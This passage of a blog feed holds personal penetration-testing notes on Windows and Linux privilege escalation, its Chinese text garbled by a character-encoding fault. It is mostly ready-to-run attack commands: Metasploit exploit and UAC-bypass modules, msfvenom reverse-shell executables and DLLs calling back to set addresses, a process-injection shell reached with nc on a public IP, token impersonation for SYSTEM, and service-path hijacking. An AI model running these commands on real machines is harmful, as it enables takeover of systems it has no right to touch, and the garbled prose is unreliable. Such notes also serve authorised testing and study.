title="msfå…¨è‡ªåŠ¨ææƒ"></a>msfå…¨è‡ªåŠ¨ææƒ</h3><h4 id="æŸ¥çœ‹session"><a href="#æŸ¥çœ‹session" class="headerlink" title="æŸ¥çœ‹session"></a>æŸ¥çœ‹session</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span><br></code></pre></td></tr></table></figure><h4 id="æ‰¾ç³»ç»Ÿå®‰è£…çš„è¡¥ä¸"><a href="#æ‰¾ç³»ç»Ÿå®‰è£…çš„è¡¥ä¸" class="headerlink" title="æ‰¾ç³»ç»Ÿå®‰è£…çš„è¡¥ä¸"></a>æ‰¾ç³»ç»Ÿå®‰è£…çš„è¡¥ä¸</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">background  <span class="hljs-comment">//æ”¾åå° çœ‹sessionçš„ç¼–å·</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">post</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">gather</span>/<span class="hljs-title">enum_patches</span>    <br><span class="hljs-title">set</span> <span class="hljs-title">sessions</span> 32<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure><h4 id="å…¨è‡ªåŠ¨å‘½ä»¤"><a href="#å…¨è‡ªåŠ¨å‘½ä»¤" class="headerlink" title="å…¨è‡ªåŠ¨å‘½ä»¤"></a>å…¨è‡ªåŠ¨å‘½ä»¤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">background  <span class="hljs-comment">//æ”¾åå° çœ‹sessionçš„ç¼–å·</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">post</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">recon</span>/<span class="hljs-title">local_exploit_suggester</span><br><span class="hljs-title">set</span> <span class="hljs-title">session</span> 32<br><span class="hljs-title">set</span> <span class="hljs-title">showdescription</span> <span class="hljs-title">true</span><br><span class="hljs-title">run</span><br>//æ‰¾å‡ºæœ‰ç”¨çš„ä¸€ä¸ªä¸€ä¸ªè¯•è¯•<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">ms16_075_reflection_juicy</span><br><span class="hljs-title">set</span> <span class="hljs-title">session</span> 32<br><span class="hljs-title">run</span>  // å³å¯æˆåŠŸææƒ<br></code></pre></td></tr></table></figure><h3 id="CSææƒ"><a href="#CSææƒ" class="headerlink" title="CSææƒ"></a>CSææƒ</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">å³é”®ï¼Œæ’ä»¶æœ‰æƒé™æå‡<br></code></pre></td></tr></table></figure><h3 id="æ‰‹å·¥ææƒ"><a href="#æ‰‹å·¥ææƒ" class="headerlink" title="æ‰‹å·¥ææƒ"></a>æ‰‹å·¥ææƒ</h3><h3 id="WIN-ATå‘½ä»¤ææƒ"><a href="#WIN-ATå‘½ä»¤ææƒ" class="headerlink" title="WIN-&gt;ATå‘½ä»¤ææƒ"></a>WIN-&gt;ATå‘½ä»¤ææƒ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ç³»ç»Ÿè‡ªå¸¦å‘½ä»¤</span><br>é€‚åˆç‰ˆæœ¬ï¼š<span class="hljs-comment">// Win2000 &amp; Win2003 &amp; XPä¸­è¿˜æ˜¯å­˜åœ¨çš„ï¼Œåœ¨Win7ä»¥åè¢«å‰”é™¤.</span><br>at <span class="hljs-number">14</span>:<span class="hljs-number">10</span> /interactive <span class="hljs-title function_ invoke__">cmd</span><br>(åœ¨<span class="hljs-number">14</span>:<span class="hljs-number">30</span>åˆ†ç”Ÿæˆä¸€ä¸ªäº¤äº’å¼çš„Systemæƒé™çš„cmd)<br></code></pre></td></tr></table></figure><h3 id="WIN-SCå‘½ä»¤"><a href="#WIN-SCå‘½ä»¤" class="headerlink" title="WIN-&gt;SCå‘½ä»¤"></a>WIN-&gt;SCå‘½ä»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ç³»ç»Ÿè‡ªå¸¦å‘½ä»¤</span><br>windows <span class="hljs-number">7</span>ã€<span class="hljs-number">8</span>ã€<span class="hljs-number">03</span>ã€<span class="hljs-number">08</span>ã€<span class="hljs-number">12</span>ã€<span class="hljs-number">16</span><br><span class="hljs-comment">#åˆ›å»ºä¸€ä¸ªåå«syscmdçš„æ–°çš„äº¤äº’å¼çš„cmdæ‰§è¡ŒæœåŠ¡</span><br>sc Create syscmd binPath= <span class="hljs-string">&quot;cmd /K start&quot;</span> type= own type= interact<br>sc Create &lt;æœåŠ¡åç§°&gt;  binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span>  type= own type= interact<br><br><span class="hljs-comment">#è¿è¡ŒæœåŠ¡</span><br>sc start syscmd<br>sc start &lt;æœåŠ¡åç§°&gt;<br></code></pre></td></tr></table></figure><h3 id="WIN-PSå‘½ä»¤ææƒ"><a href="#WIN-PSå‘½ä»¤ææƒ" class="headerlink" title="WIN-&gt;PSå‘½ä»¤ææƒ"></a>WIN-&gt;PSå‘½ä»¤ææƒ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ‰‹åˆ°ä¸‹è½½ä¸Šä¼ </span><br><span class="hljs-number">1</span>.<span class="hljs-comment">// é€‚ç”¨ç‰ˆæœ¬: win2012 &amp; win2008 &amp; Win2016</span><br>https:<span class="hljs-comment">//docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br>è¿è¡Œï¼š<br>psexec.exe -accepteula -s -i -d cmd <span class="hljs-comment">#è°ƒç”¨è¿è¡Œcmd</span><br></code></pre></td></tr></table></figure><p><img src="/image/1-16837861584191.png" alt="1"></p><h3 id="WIN-è¿›ç¨‹è¿ç§»"><a href="#WIN-è¿›ç¨‹è¿ç§»" class="headerlink" title="WIN-&gt;è¿›ç¨‹è¿ç§»"></a>WIN-&gt;è¿›ç¨‹è¿ç§»</h3><h5 id="pinjector-exe"><a href="#pinjector-exe" class="headerlink" title="pinjector.exe"></a>pinjector.exe</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">pinjector.exeå·¥å…·<br>pinjector -l<br>pinjector -p <span class="hljs-number">436</span> cmd <span class="hljs-number">1111</span><br>nc <span class="hljs-number">43.138</span>.<span class="hljs-number">215.2</span> <span class="hljs-number">1111</span><br><br>Ps:nc -<span class="hljs-number">1</span> <span class="hljs-number">1111</span>ç›‘å¬ç«¯å£<br></code></pre></td></tr></table></figure><h5 id="msfè¿›ç¨‹è¿ç§»"><a href="#msfè¿›ç¨‹è¿ç§»" class="headerlink" title="msfè¿›ç¨‹è¿ç§»"></a>msfè¿›ç¨‹è¿ç§»</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.ç”Ÿæˆæœ¨é©¬å¹¶è¿è¡Œ<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe -o msf.exe<br>set Iport/Thost/payload<br>  <span class="hljs-comment">// payload =windows/meterpreter/reverse_tcp</span><br>run<br><br><span class="hljs-number">2</span>.æƒé™è¿ç§» <br>ps     <span class="hljs-comment">//æŸ¥çœ‹è¿›ç¨‹</span><br>migrate PID       <span class="hljs-comment">//è¿ç§»å¯¹åº”PID</span><br></code></pre></td></tr></table></figure><h3 id="WIN-ä»¤ç‰Œçªƒå–ææƒ"><a href="#WIN-ä»¤ç‰Œçªƒå–ææƒ" class="headerlink" title="WIN-&gt;ä»¤ç‰Œçªƒå–ææƒ"></a>WIN-&gt;ä»¤ç‰Œçªƒå–ææƒ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ä»¤ç‰Œçªƒå– Win2008 Win2012 é˜¿é‡Œäº‘æœåŠ¡å™¨<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe -o msf.exe<br>set Iport/Thost/payload<br>wrun<br></code></pre></td></tr></table></figure><h5 id="æœ¬åœ°æƒé™"><a href="#æœ¬åœ°æƒé™" class="headerlink" title="æœ¬åœ°æƒé™"></a>æœ¬åœ°æƒé™</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">meterpreter &gt;  <span class="hljs-keyword">use</span> <span class="hljs-title">incognito</span><br>// ç›´æ¥åœ¨<span class="hljs-title">meterpreter</span>é‡Œè¿è¡Œï¼Œä¸ç”¨é€€å‡º<br><span class="hljs-title">use</span> <span class="hljs-title">incognito</span><br><span class="hljs-title">list_tokens</span> -<span class="hljs-title">ux</span><br><span class="hljs-title">impersonate_token</span> &quot;<span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">SYSTEM</span>&quot;<br></code></pre></td></tr></table></figure><h5 id="WEBæƒé™"><a href="#WEBæƒé™" class="headerlink" title="WEBæƒé™"></a>WEBæƒé™</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¸Šä¼ potato.exe<br><br>execute -cH -f ./potato.exe <span class="hljs-comment">//é…åˆçƒ‚å£«è±†ã€ŠåŸç†: åˆ©ç”¨MS16_075æ¼æ´)</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">incognito</span><br><span class="hljs-title">list_tokens</span> -<span class="hljs-title">u</span><br><span class="hljs-title">impersonate_token</span> &quot;<span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">SYSTEM</span>&quot;<br></code></pre></td></tr></table></figure><h3 id="WIN-getsytemææƒ"><a href="#WIN-getsytemææƒ" class="headerlink" title="WIN-&gt;getsytemææƒ"></a>WIN-&gt;getsytemææƒ</h3><h5 id="msfè‡ªåŠ¨ææƒ"><a href="#msfè‡ªåŠ¨ææƒ" class="headerlink" title="msfè‡ªåŠ¨ææƒ"></a>msfè‡ªåŠ¨ææƒ</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">handler</span><br><span class="hljs-title">set</span> <span class="hljs-title">PAYLOAD</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span><br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 192.168.234.133<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 3333<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430175152218.png" alt="image-20230430175152218"></p><h3 id="UACç»•è¿‡"><a href="#UACç»•è¿‡" class="headerlink" title="UACç»•è¿‡"></a>UACç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ä»‹ç»ï¼š</span><br><span class="hljs-comment">// uacä¸€èˆ¬æŒ‡ç”¨æˆ·è´¦æˆ·æ§åˆ¶ã€‚ ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUser Account Controlï¼Œç®€å†™ä½œUAC)æ˜¯å¾®è½¯å…¬å¸åœ¨å…¶Windows VistaåŠæ›´é«˜ç‰ˆæœ¬æ“ä½œç³»ç»Ÿä¸­é‡‡ç”¨çš„ä¸€ç§æ§åˆ¶æœºåˆ¶ã€‚</span><br><span class="hljs-comment">// msconfig &gt; å·¥å…·</span><br><span class="hljs-comment">// UACæœ‰ä¸‰ä¸ªæ¨¡å¼ ä½ã€ä¸­ã€é«˜ã€‚å¼€å¯ä»»æ„æ¨¡å¼ï¼Œgetsystemå‘½ä»¤å¤±æ•ˆã€‚å› æ­¤éœ€è¦ç»•è¿‡</span><br><br>ä½¿ç”¨msfæœç´¢ UACç›¸å…³ï¼Œå¯è§åˆ°bypassæ¨¡å—<br>search UAC<br>-Test in win7 æœ¬åœ°ç”µè„‘ æœ¬åœ°æƒé™<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac</span><br>-<span class="hljs-title">Test</span> <span class="hljs-title">in</span> <span class="hljs-title">win10</span> æœ¬åœ°ç”µè„‘ æœ¬åœ°æƒé™<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">ask</span>     (ç›¸å½“äºé’“é±¼ã€‚ç”¨äºé«˜ç­‰çº§)<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac_sTuihijack</span><br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac_silentcleanup</span><br></code></pre></td></tr></table></figure><h5 id="UACMEå·¥å…·"><a href="#UACMEå·¥å…·" class="headerlink" title="UACMEå·¥å…·"></a>UACMEå·¥å…·</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//github.com/hfirefOx/UACME</span><br>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¸Šçº¿<br>Akagi64.exe <span class="hljs-number">41</span> msf1.exe<br>Akagi64.exe &lt;ç¼–å·&gt; &lt;è°ƒç”¨æ‰§è¡Œ&gt;<br><span class="hljs-number">23</span>/<span class="hljs-number">41</span>/<span class="hljs-number">61</span>å¸¸ç”¨ç¼–å·<br><br>msfé€šè¿‡ä¸Šé¢å·¥å…·ä¸Šçº¿åã€‚æ‰§è¡Œgetsystemå³å¯<br></code></pre></td></tr></table></figure><h3 id="åˆ¶ä½œdllæœ¨é©¬ä¸Šä¼ "><a href="#åˆ¶ä½œdllæœ¨é©¬ä¸Šä¼ " class="headerlink" title="åˆ¶ä½œdllæœ¨é©¬ä¸Šä¼ "></a>åˆ¶ä½œdllæœ¨é©¬ä¸Šä¼ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åˆ©ç”¨ç«ç»’å‰‘è¿›è¡Œè¿›ç¨‹åˆ†æåŠ è½½DLLï¼Œä¸€èˆ¬å¯»ç¨‹åºDLLåˆ©ç”¨ã€‚</span><br>msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> lport=<span class="hljs-number">4444</span> -f dll -o yeye.dll<br>  <br><span class="hljs-comment">// ç­‰å¾…è§¦å‘</span><br></code></pre></td></tr></table></figure><h3 id="æ°¸æ’ä¹‹è“"><a href="#æ°¸æ’ä¹‹è“" class="headerlink" title="æ°¸æ’ä¹‹è“"></a>æ°¸æ’ä¹‹è“</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ms17_<br></code></pre></td></tr></table></figure><h3 id="Win-ä¸å¸¦å¼•å·çš„æœåŠ¡"><a href="#Win-ä¸å¸¦å¼•å·çš„æœåŠ¡" class="headerlink" title="Win-&gt;ä¸å¸¦å¼•å·çš„æœåŠ¡"></a>Win-&gt;ä¸å¸¦å¼•å·çš„æœåŠ¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åŸç†ï¼šå³ä½¿æ­£ç¡®å¼•ç”¨äº†æœåŠ¡è·¯å¾„ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å…¶ä»–æ¼æ´ã€‚ç”±äºç®¡ç†é…ç½®é”™è¯¯ï¼Œç”¨æˆ·å¯èƒ½å¯¹æœåŠ¡æ‹¥æœ‰è¿‡å¤šçš„æƒé™ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å®ƒå¯¼è‡´é‡å®šå‘æ‰§è¡Œæ–‡ä»¶ã€‚</span><br><br><br>æœåŠ¡åç§°ï¼š ä¸º C:/AA X86/MM.EXE æ²¡æœ‰åŒå¼•å·+è·¯å¾„ä¸­æœ‰ç©ºæ ¼   æœ‰åˆ™è¿™æ˜¯ä¸å®‰å…¨çš„<br>å¯æ„é€ æœ¨é©¬å³è·¯å¾„ä¸ºï¼š C:/AA.exeå¦‚æ­¤ä¸Šé¢æœåŠ¡è¢«è°ƒç”¨çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°æˆ‘ä»¬çš„æœ¨é©¬ç¨‹åº<br></code></pre></td></tr></table></figure><h5 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ–¹å¼ä¸€</span><br><span class="hljs-number">1</span>.msfä¸Šçº¿+ä¸Šä¼ jaws-<span class="hljs-keyword">enum</span>.ps1æ–‡ä»¶<br><span class="hljs-number">2</span>.è°ƒç”¨shell ä¸­çš„ powershell <br><span class="hljs-number">3</span>.æ‰§è¡Œæ–‡ä»¶  .\jaws-<span class="hljs-keyword">enum</span>.ps1<br><br><span class="hljs-comment">// æ–¹å¼äºŒ</span><br>æ£€æµ‹å‘½ä»¤ï¼šwmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430205314368.png" alt="image-20230430205314368"></p><p>ä¸Šå›¾ä¸­  QiYouDaemon å¯ä»¥è¢«åˆ©ç”¨  &#x3D;&#x3D;ã€‹ä¸Šä¼ æœ¨é©¬ D:&#x2F;Program.exe å³å¯</p><p><img src="/image/image-20230430210202509.png" alt="image-20230430210202509"></p><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ä¸»åŠ¨è°ƒç”¨ï¼ˆéœ€è¦é«˜æƒé™ï¼‰ï¼š<span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> <span class="hljs-string">&quot;QiYouDaemon&quot;</span><br><br>è¢«åŠ¨è°ƒç”¨ï¼šç­‰å¾…è¢«è°ƒç”¨ï¼ˆç”µè„‘é‡å¯ç­‰ç­‰ï¼‰<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430210100392.png" alt="image-20230430210100392"></p><h3 id="Win-ä¸å®‰å…¨çš„æœåŠ¡"><a href="#Win-ä¸å®‰å…¨çš„æœåŠ¡" class="headerlink" title="Win-&gt;ä¸å®‰å…¨çš„æœåŠ¡"></a>Win-&gt;ä¸å®‰å…¨çš„æœåŠ¡</h3><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">åŸç†ï¼šå³ä½¿æ­£ç¡®å¼•ç”¨äº†æœåŠ¡è·¯å¾„ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å…¶ä»–æ¼æ´ã€‚ç”±äºç®¡ç†é…ç½®é”™è¯¯ï¼Œç”¨æˆ·å¯èƒ½å¯¹æœåŠ¡æ‹¥æœ‰è¿‡å¤šçš„æƒé™ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹å®ƒå¯¼è‡´é‡å®šå‘æ‰§è¡Œæ–‡ä»¶ã€‚<br></code></pre></td></tr></table></figure><h5 id="æ£€æµ‹-1"><a href="#æ£€æµ‹-1" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h5><p>è¿è¡Œè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.accesschk.exe -uwcqv <span class="hljs-string">&quot;administrators&quot;</span> *<br><br><span class="hljs-number">2</span>.æ‰¾æƒé™ä¸ºâ€œSERVICE_ALL_ACCESSâ€çš„æœåŠ¡<br><br><span class="hljs-number">3</span>.é…ç½® sc config <span class="hljs-string">&quot;vds&quot;</span> binpath=<span class="hljs-string">&quot;C:\1.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430212113038.png" alt="image-20230430212113038"></p><h5 id="ä¸Šçº¿"><a href="#ä¸Šçº¿" class="headerlink" title="ä¸Šçº¿"></a>ä¸Šçº¿</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> vds   æ‰‹åŠ¨å¯åŠ¨ä¸Šçº¿/æˆ–è€…ç­‰å¾…æœåŠ¡è¢«è°ƒç”¨ä¸Šçº¿<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430211958854.png" alt="image-20230430211958854"></p><p><img src="/image/image-20230430212151767.png" alt="image-20230430212151767"></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æƒé™æå‡_linux</title>
    <link href="/2022/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux/"/>
    <url>/2022/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux/</url>
    
    <content type="html"><![CDATA[<h1 id="æƒé™æå‡-linux"><a href="#æƒé™æå‡-linux" class="headerlink" title="æƒé™æå‡_linux"></a>æƒé™æå‡_linux</h1><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl ifconfig.me å¯è§è‡ªå·±IP<br>ç½‘å¡ifconfig<br>åˆ¤æ–­æƒé™id<br>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ uname -srm<br><br><br>*ä¸€ä¸ªç»¼åˆç±»æ¢é’ˆï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/liamg/</span>traitorï¼ˆä¸Šä¼ èµ‹æƒåç›´æ¥è¿è¡Œå³å¯ï¼‰<br><br>ä¸€ä¸ªè‡ªåŠ¨åŒ–ææƒï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AlessandroZ/</span>BeRoot ï¼ˆéœ€è¦pyç¯å¢ƒï¼‰<br><br>*ä¿¡æ¯æ”¶é›†ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnumï¼ˆå‡ºç³»ç»Ÿä¿¡æ¯ï¼‰<br>*ä¿¡æ¯æ”¶é›†ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggesterï¼ˆå‡ºEXPä¿¡æ¯ï¼‰<br><br>æ¼æ´æ¢é’ˆï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sleventyeleven/</span>linuxprivcheckerï¼ˆéœ€è¦pyç¯å¢ƒï¼‰<br>*æ¼æ´æ¢é’ˆï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jondonas/</span>linux-exploit-suggester-<span class="hljs-number">2</span><br><br>äºŒè¿›åˆ¶æ–‡ä»¶ææƒæŸ¥è¯¢ï¼š<br>Linuxï¼šhttps:<span class="hljs-regexp">//g</span>tfobins.github.io/<br>Windowsï¼šhttps:<span class="hljs-regexp">//</span>lolbas-project.github.io/<br><br>set payload php<span class="hljs-regexp">/meter--/</span>reverse--<br><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230506163452733.png" alt="image-20230506163452733"></p><h2 id="äºŒã€SUIDææƒ"><a href="#äºŒã€SUIDææƒ" class="headerlink" title="äºŒã€SUIDææƒ"></a>äºŒã€SUIDææƒ</h2><h3 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1.åŸç†"></a>1.åŸç†</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ˜¯ä»€ä¹ˆï¼Ÿ<br>SUIDï¼ˆ<span class="hljs-built_in">Set</span><span class="hljs-built_in"> User </span>IDï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„æƒé™è®¾ç½®ï¼Œ<br>ç”¨äºåœ¨æ‰§è¡Œç¨‹åºæ—¶å°†æœ‰æ•ˆç”¨æˆ·IDï¼ˆæ™®é€šï¼‰ï¼ˆUIDï¼‰ä¸´æ—¶æ›´æ”¹ä¸ºç¨‹åºæ–‡ä»¶æ‰€æœ‰è€…çš„UIDï¼ˆç®¡ç†å‘˜ï¼‰ã€‚<br><br>root  suid-&gt;<span class="hljs-built_in">find</span><br>  â†“<br>boy (è¿ç»´äººå‘˜)  <span class="hljs-built_in">find</span> ï¼ˆrootï¼‰--&gt; nc (root)<br><br><br>æ¼æ´æˆå› ï¼šchmod u+sç»™äºˆäº†suid u-såˆ é™¤äº†suid<br>å¦‚ï¼šchmod u+s /usr/bin/<span class="hljs-built_in">find</span><br><br><br>ä½¿ç¨‹åºåœ¨è¿è¡Œä¸­å—åˆ°äº†suid 